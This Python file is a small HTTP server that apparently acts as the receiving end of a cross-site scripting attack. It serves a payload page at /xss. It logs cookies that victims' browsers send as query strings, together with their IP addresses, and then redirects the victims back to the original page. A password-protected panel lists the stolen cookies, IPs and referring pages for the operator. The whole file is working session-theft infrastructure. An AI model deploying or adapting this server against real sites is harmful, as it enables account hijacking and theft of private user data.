
from http.server import HTTPServer, BaseHTTPRequestHandler
import io,urllib,shutil,base64
from tools import logger,cookie_log
import tools



class request_server(BaseHTTPRequestHandler):
    server_version = "woshizhu/1.1"
    sys_version = "nishizhu/1.2"
    def err(self):
        
        self.send_response(404)
        self.send_header('Content-type','text/html')
        self.end_headers()
        logger.info("已做404error处理")

    def do_GET(self):
        try:
            logger.info(self.client_address)
            logger.info(self.command)
            logger.info(self.path)

            if "/xss" == self.path:
                
                html = tools.html
                encoded = ''.join(html).encode("UTF-8")     
                f = io.BytesIO()     
                f.write(encoded)     
                f.seek(0)     
                self.send_response(200)     
                self.send_header("Content-type", "text/html; charset=utf8" )     
                self.send_header("Content-Length", str(len(encoded)))     
                self.end_headers()     
                shutil.copyfileobj(f,self.wfile)  

            elif "/?" in self.path:

                data = self.path[2:]
                write_cookie = ':'.join(map(str,self.client_address)) + self.path
                cookie_log.info(write_cookie)
                #cookie_log.info(data)


                if "::" in data:
                    refer = data.split("::")[1]
                    self.send_response(303)
                    self.send_header('Content-type','text/html')
                    self.send_header("Location", refer) 
                    self.end_headers() 

                else:
                    self.send_response(500)
                    self.send_header('Content-type','text/html')
                    self.end_headers()

            elif "/xss?password=" in self.path:
                
                pw = self.path.split("password=")[1]
                if pw == tools.passwd or pw == tools.visitor_passwd:

                    html_show = []
                    html_up = tools.html_up
                    html_show.append(html_up)
                    fff = open("cookie.log","r")
                    cookie_list = fff.readlines()
                    fff.close
                    cookie_list = cookie_list[::-1]
                    for y,x in enumerate(cookie_list):

                        c_num = str(y+1)
                        c_time = x.split("[")[1].split("]")[0]
                        cc_ip = x.split(" : ")[1].split("::")[0]
                        c_cookie = "无"
                        c_refer = "无"
                        if "/?" in cc_ip:
                            c_ip = cc_ip.split("/?")[0]
                            c_cookie = cc_ip.split("/?")[1]
                        else:
                            c_ip = cc_ip
                        c_refer = x.split("::")[1]

                        flush = "<tr><td>" + c_num + "</td><td>" + c_time + "</td><td>" + c_ip + "</td><td>" + c_cookie + "</td><td>" + c_refer + "</td></tr>"
                        html_show.append(flush)

                        if y == tools.visitor_num:
                            if tools.visitor_passwd == pw:
                                break;

                    html_down = "</table></body></html>"
                    html_show.append(html_down)
                    
                    html_encoded = ''.join(html_show).encode("UTF-8")     
                    ff = io.BytesIO()     
                    ff.write(html_encoded)     
                    ff.seek(0)     
                    self.send_response(200)     
                    self.send_header("Content-type", "text/html; charset=utf8" )     
                    self.send_header("Content-Length", str(len(html_encoded)))     
                    self.end_headers()     
                    shutil.copyfileobj(ff,self.wfile)
                    
        except:
            logger.info("无参数的GET请求报错 IP 参数")
            logger.info(self.client_address)
            logger.info(self.path)
            logger.info("处理结束")
            request_server.err(self)

    def do_POST(self):
        request_server.err(self)


if __name__ == '__main__':
    try:
        server = HTTPServer(tools.host,request_server)
        logger.info("服务启动")
        server.serve_forever()
    except:
        logger.info("服务出错")